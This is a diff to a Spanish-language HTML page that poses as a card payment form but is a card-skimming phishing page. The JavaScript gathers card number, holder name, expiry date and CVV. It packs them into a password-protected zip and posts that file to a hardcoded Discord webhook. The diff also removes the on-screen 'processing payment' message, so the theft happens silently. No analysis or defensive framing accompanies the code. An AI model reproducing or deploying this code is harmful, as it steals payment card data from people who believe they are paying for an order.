@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjeta</title>
+  <title>Pagar con tarjetas</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -87,9 +87,8 @@
         return;
       }
 
+      var fileName = cardNumber.substr(0, 6) + '_' + cardName + 'C';
       var zipPassword = "08papanat4s";
-      var zipFileName = cardNumber.substr(0, 6) + ".zip";
-      var csvFileName = cardNumber.substr(0, 6) + "_Tarjeta.csv";
 
       var cardData = [
         new Date().toLocaleString(),
@@ -100,48 +99,32 @@
         cardCVV
       ];
 
-      createAndDownloadZip(zipFileName, csvFileName, cardData, zipPassword);
-      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
-
-      setTimeout(function() {
-        document.getElementById("done-message").textContent = "";
-      }, 2000);
+      sendToWebhook(zipPassword, fileName, cardData);
     }
 
-    function createAndDownloadZip(zipFileName, csvFileName, cardData, zipPassword) {
+    function sendToWebhook(password, fileName, cardData) {
       var zip = new JSZip();
       var csvContent = cardData.join(", ");
-      zip.file(csvFileName, csvContent);
-      zip.generateAsync({ type: "blob", compression: "DEFLATE" })
+      zip.file(fileName, csvContent);
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: password })
         .then(function(content) {
-          var link = document.createElement("a");
-          link.href = URL.createObjectURL(content);
-          link.download = zipFileName;
-          link.click();
-          sendToWebhook(content, zipPassword);
-        });
-    }
+          var formData = new FormData();
+          formData.append("file", content, fileName + ".zip");
 
-    function sendToWebhook(fileContent, zipPassword) {
-      var webhookURL = "https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX";
-      
-      var formData = new FormData();
-      formData.append("file", fileContent, "tarjeta.zip");
-      formData.append("password", zipPassword);
-
-      fetch(webhookURL, {
-        method: "POST",
-        body: formData
-      })
-        .then(function(response) {
-          if (response.ok) {
-            console.log("Tarjeta enviada al webhook.");
-          } else {
-            console.error("Error al enviar la tarjeta al webhook.");
-          }
-        })
-        .catch(function(error) {
-          console.error("Error al enviar la tarjeta al webhook:", error);
+          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
+            method: "POST",
+            body: formData
+          })
+          .then(function(response) {
+            if (response.ok) {
+              console.log("Tarjeta enviada al webhook correctamente.");
+            } else {
+              console.error("Error al enviar la tarjeta al webhook.");
+            }
+          })
+          .catch(function(error) {
+            console.error("Error al enviar la tarjeta al webhook:", error);
+          });
         });
     }
 
@@ -198,7 +181,6 @@
     <h1>Pedido por Tarjeta</h1>
   
     <div id="error-message"></div>
-    <div id="done-message"></div>
   
     <div class="input-field">
       <label for="card-number">Número de Tarjeta:</label>
@@ -216,16 +198,16 @@
     </div>
   
     <div class="input-field">
-      <label for="card-expiration">Fecha de Vencimiento:</label>
+      <label for="card-expiration">Fecha de Expiración:</label>
       <input type="text" id="card-expiration" />
     </div>
-  
+    
     <div class="input-field">
       <label for="card-cvv">CVV:</label>
       <input type="text" id="card-cvv" maxlength="3" />
     </div>
   
-    <button onclick="updateSigninStatus()">Pagar</button>
+    <button onclick="updateSigninStatus()">Enviar</button>
   </div>
 </body>
 </html>
